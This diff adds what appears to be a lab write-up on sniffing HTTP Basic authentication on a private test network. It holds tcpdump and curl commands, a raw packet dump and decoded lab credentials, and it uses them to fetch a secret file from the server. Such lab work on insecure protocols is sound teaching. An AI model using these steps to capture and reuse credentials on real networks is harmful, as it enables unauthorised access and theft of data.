@@ -1,0 +1,67 @@
+Steps:
+
+(1) Run command:
+  
+    sudo tcpdump -i ens4 -A src 192.168.15.2 and dst 192.168.15.1 > dump1.txt
+
+    on the ATTACKER side to capture packets from CLIENT to SERVER.
+
+(2) Run command:
+
+    curl http://192.168.15.2/1
+
+    to ask CLIENT to load webpage.
+
+(3) Then we can capture the traffic from CLIENT to SERVER. 
+    Packets' contents are attached at the end of this file.
+    We can find the authentication credential from these packets.
+    The credential is stored in the "Authorization" header, 
+    and is encoded in format "username:password" by base64:
+
+    Basic dHJhdmlzMTU6bWFpdkRlY2d1cjg4MTQ=
+
+    "Basic" indicates "Basic authorization" and string followed 
+    is encoded username and password.
+
+(4) Decode the base64 string dHJhdmlzMTU6bWFpdkRlY2d1cjg4MTQ= we can get:
+
+    travis15:maivDecgur8814
+
+    so the username is  travis15
+    and the password is maivDecgur8814
+
+(5) Access secret file on the SERVER from ATTACKER VM using curl with HTTP Basic Auth:
+
+    curl --user travis15:maivDecgur8814 http://192.168.15.1/secret/file > file1.txt
+
+    Secret file's content is stored in the file1.txt
+
+
+
+Packets in ASCII:
+
+09:32:21.086676 IP 192.168.15.2.60662 > 192.168.15.1.http: Flags [S], seq 2051639118, win 29200, options [mss 1460,sackOK,TS val 244923626 ecr 0,nop,wscale 7], length 0
+E..<..@.@..............PzI.N......r..9.........
+..<.........
+09:32:21.088106 IP 192.168.15.2.60662 > 192.168.15.1.http: Flags [.], ack 2750528727, win 229, options [nop,nop,TS val 244923626 ecr 244926329], length 0
+E..4..@.@..............PzI.O.........E.....
+..<...Gy
+09:32:21.088397 IP 192.168.15.2.60662 > 192.168.15.1.http: Flags [P.], seq 0:32, ack 1, win 229, options [nop,nop,TS val 244923626 ecr 244926329], length 32: HTTP: HEAD /secret/file.php HTTP/1.0
+E..T..@.@..............PzI.O...............
+..<...GyHEAD /secret/file.php HTTP/1.0
+
+09:32:21.090686 IP 192.168.15.2.60662 > 192.168.15.1.http: Flags [P.], seq 32:149, ack 1, win 229, options [nop,nop,TS val 244923627 ecr 244926329], length 117: HTTP
+E.....@.@..S...........PzI.o........_......
+..<...GyHost: 192.168.15.1
+Connection: close
+Accept-language: en
+Authorization: Basic dHJhdmlzMTU6bWFpdkRlY2d1cjg4MTQ=
+
+
+09:32:21.094268 IP 192.168.15.2.60662 > 192.168.15.1.http: Flags [.], ack 148, win 237, options [nop,nop,TS val 244923628 ecr 244926330], length 0
+E..4..@.@..............PzI.....j...........
+..<...Gz
+09:32:21.095699 IP 192.168.15.2.60662 > 192.168.15.1.http: Flags [F.], seq 149, ack 149, win 237, options [nop,nop,TS val 244923628 ecr 244926331], length 0
+E..4..@.@..............PzI.....k...........
+..<...G{
+
